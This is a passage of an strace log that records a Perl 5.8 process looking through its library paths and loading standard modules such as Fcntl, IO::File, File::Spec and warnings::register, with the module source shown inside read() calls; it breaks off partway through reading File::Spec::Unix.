9851  20:00:43.711563 stat64("/etc/perl/Fcntl.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.711576 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711589 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.711603 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711616 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.711630 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711642 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.711655 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711667 stat64("/usr/share/perl5/Fcntl.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.711681 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.711693 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
9851  20:00:43.711714 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.711729 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.711740 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.711759 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
9851  20:00:43.712158 brk(0x81f7000)    = 0x81f7000
9851  20:00:43.712336 read(8, "", 4096) = 0
9851  20:00:43.712358 close(8)          = 0
9851  20:00:43.712430 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
9851  20:00:43.712466 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
9851  20:00:43.712493 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
9851  20:00:43.718913 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
9851  20:00:43.718913 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
9851  20:00:43.718913 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7ddb000
9851  20:00:43.718913 mmap2(0xb7dde000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7dde000
9851  20:00:43.718913 close(8)          = 0
9851  20:00:43.718957 read(6, "", 4096) = 0
9851  20:00:43.718972 close(6)          = 0
9851  20:00:43.719005 stat64("/etc/perl/IO/File.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719021 stat64("/etc/perl/IO/File.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719047 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719062 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719077 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719090 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719104 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719116 stat64("/usr/lib/perl5/IO/File.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719129 stat64("/usr/share/perl5/IO/File.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719142 stat64("/usr/share/perl5/IO/File.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719155 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719168 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
9851  20:00:43.719190 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.719205 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.719217 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.719235 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
9851  20:00:43.719482 stat64("/etc/perl/File/Spec.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719498 stat64("/etc/perl/File/Spec.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.719512 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719525 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.719846 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.719988 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.720059 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720098 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.720128 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720152 stat64("/usr/share/perl5/File/Spec.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.720173 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720186 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.720200 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720214 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
9851  20:00:43.720236 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.720251 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.720262 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.720281 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
9851  20:00:43.720358 stat64("/etc/perl/vars.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.720371 stat64("/etc/perl/vars.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.720385 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.720397 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.720412 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.720424 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.720439 stat64("/usr/lib/perl5/vars.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.720451 stat64("/usr/lib/perl5/vars.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.720469 stat64("/usr/share/perl5/vars.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.720481 stat64("/usr/share/perl5/vars.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.720494 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.720516 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf9ef4fc) = -1 ENOENT (No such file or directory)
9851  20:00:43.720531 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf9ef5ec) = -1 ENOENT (No such file or directory)
9851  20:00:43.720544 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
9851  20:00:43.720565 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
9851  20:00:43.720579 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef308) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.720590 _llseek(10, 0, [0], SEEK_CUR) = 0
9851  20:00:43.720608 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
9851  20:00:43.720722 stat64("/etc/perl/warnings/register.pmc", 0xbf9ef13c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720737 stat64("/etc/perl/warnings/register.pm", 0xbf9ef04c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720751 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf9ef13c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720765 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf9ef04c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720779 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf9ef13c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720793 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf9ef04c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720808 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf9ef13c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720821 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf9ef04c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720834 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf9ef13c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720847 stat64("/usr/share/perl5/warnings/register.pm", 0xbf9ef04c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720861 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf9ef13c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720875 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf9ef04c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720889 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf9ef13c) = -1 ENOENT (No such file or directory)
9851  20:00:43.720903 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
9851  20:00:43.720924 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
9851  20:00:43.720943 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9eee58) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.720954 _llseek(11, 0, [0], SEEK_CUR) = 0
9851  20:00:43.720973 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
9851  20:00:43.721128 read(11, "", 4096) = 0
9851  20:00:43.721142 close(11)         = 0
9851  20:00:43.721338 _llseek(10, 1148, [1148], SEEK_SET) = 0
9851  20:00:43.721354 _llseek(10, 0, [1148], SEEK_CUR) = 0
9851  20:00:43.721365 close(10)         = 0
9851  20:00:43.721434 _llseek(8, 594, [594], SEEK_SET) = 0
9851  20:00:43.721449 _llseek(8, 0, [594], SEEK_CUR) = 0
9851  20:00:43.721459 close(8)          = 0
9851  20:00:43.721492 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.721518 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.721533 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.721546 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.721561 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.721574 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.721589 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.721602 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.721615 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.721628 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.721642 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.721656 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.721670 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.721683 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
9851  20:00:43.721706 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.721721 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.721733 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.721757 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict 